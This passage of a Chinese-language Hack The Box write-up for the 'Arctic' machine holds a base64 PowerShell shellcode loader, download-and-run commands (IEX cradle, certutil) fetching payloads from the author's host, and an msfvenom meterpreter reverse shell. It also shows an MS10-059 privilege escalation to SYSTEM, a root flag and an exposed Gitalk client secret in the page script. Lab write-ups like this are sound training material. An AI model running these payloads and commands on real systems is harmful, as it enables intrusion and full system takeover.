EkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA&#39;+&#39;==&#39;)
</code></pre>
<p>保存到 exploit.html</p>
<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]
└─# python3 -m http.server 80                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>
<p>开启一个 HTTP 服务器</p>
<pre><code class="bash">powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.4/exploit.html&#39;)&quot;
</code></pre>
<p>在我们的 shell 里使用 powershell 下载刚才的 shell</p>
<p>但是最后我还是失败了</p>
<h2 id="成功的方法"><a href="#成功的方法" class="headerlink" title="成功的方法"></a>成功的方法</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=5555 -f exe &gt; exploit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
</code></pre>
<p>使用 msfvenom 生成一个 exe 的 payload</p>
<pre><code class="bash">msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
</code></pre>
<p>然后在 msf 里使用上面的模块</p>
<pre><code class="bash">msf6 exploit(multi/handler) &gt; show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>
<p>然后修改一下 msf 的配置文件</p>
<pre><code class="bash">msf6 exploit(multi/handler) &gt; show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>
<p>设置好以后开始监听</p>
<pre><code class="bash">msf6 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.4:5555
</code></pre>
<pre><code class="bash">certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe
</code></pre>
<p>使用上面的命令进行下载 exploit.exe</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49738
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin&gt;certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe
certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
</code></pre>
<p>成功下载</p>
<p>然后运行一下</p>
<pre><code class="bash">C:\ColdFusion8\runtime\bin&gt;exploit.exe
exploit.exe
</code></pre>
<pre><code class="bash">msf6 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.4:5555 
[*] Sending stage (175174 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.16.4:5555 -&gt; 10.10.10.11:49746) at 2022-03-24 04:31:53 -0400

meterpreter &gt; getuid
Server username: ARCTIC\tolis
</code></pre>
<p>成功用 msf 拿到了 shell</p>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>使用 ms10-059</p>
<blockquote>
<p><a href="https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git" target="_blank" rel="noopener">https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git</a></p>
</blockquote>
<p>然后使用 certutil 将我们的 Chimichurri.exe 下载进去</p>
<pre><code class="bash">certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe
</code></pre>
<p>然后使用 nc 监听一个端口</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 5555   
listening on [any] 5555 ...
</code></pre>
<pre><code class="bash">C:\ColdFusion8\runtime\bin&gt;certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe
certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.
</code></pre>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 5555   
listening on [any] 5555 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49208
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin&gt;whoami
whoami
nt authority\system
</code></pre>
<p>成功拿到 system 权限</p>
<pre><code class="bash">C:\Users\Administrator\Desktop&gt;type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
fa6be5a3ab5fb06b70586f96932c3e09
</code></pre>
<p>成功拿到 root 权限的 flag 文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/&title=《Arctic - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/&title=《Arctic - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Arctic - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/03/28/Hackthebox%20-%20Grandpa/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Grandpa - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/03/25/Hackthebox%20-%20RouterSpace/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">RouterSpace - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/&title=《Arctic - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/&title=《Arctic - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Arctic - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACM0lEQVR42u3ay07DQAwF0P7/TweJFagkXNstIjMnq6pAMicL49fjEV/H5/X18/M3Zz99vs/ZHa7/9gUXBgbGbRnH5XV20Co7f+I175SKgYGxAaN6lOs75AdNAnHyRAwMDIw8FCaZWzVlxMDAwJgE3KR87SV/GBgYGL0iNk/vcsb1Hd5Si2NgYNyQ0RsM/M3nt883MDAw/j3jGFy9p8ybdD+cBAMDY2lG0gibjAGScjdf2vjlhBgYGIsy8oZ+0p7Lfz+nRi8UAwNjG0YeLqvlbu9wSWOu0C/EwMC4LSNpe/VSul5xWx0YYGBg7MCoHrQXCvMRaX6H8uQTAwPjtox5Wz9hVwvgJBCXSRgYGLdl5KbeaLN6rOqYAQMDYwdGUiL2UsAkpUtSzMKpMDAwFmXkqVuv7Mw/96rRb/83MDAwFmVMmmWTRliv6C1X3hgYGEszqoOB6qJY/n1zGICBgbEQo9om6w0me0sbhZCNgYGxDSNpjeWHq5bB1YL5dCSAgYGxHGOeJua3ng8SmmUzBgbGEoxkPFAlVZPIXrMvek8YGBgLMSarEtXFsurri0pcDAyMpRnVQ+dN/GpZ21u8wMDAWJtxFK98PJAkhfOxAQYGxg6MXoTuLU9Ux5PJczEwMPZh5EGwNwaoBtNmwMXAwNiA8Y74naeAk60JDAwMjHxVYpJETkpZDAwMjMmhq0sVo4EBBgbGBoxeGjdf1OiNPzEwMHZjzIPyZJmsGu6r62gYGBg3Z3wAmY+yUA6XPxgAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
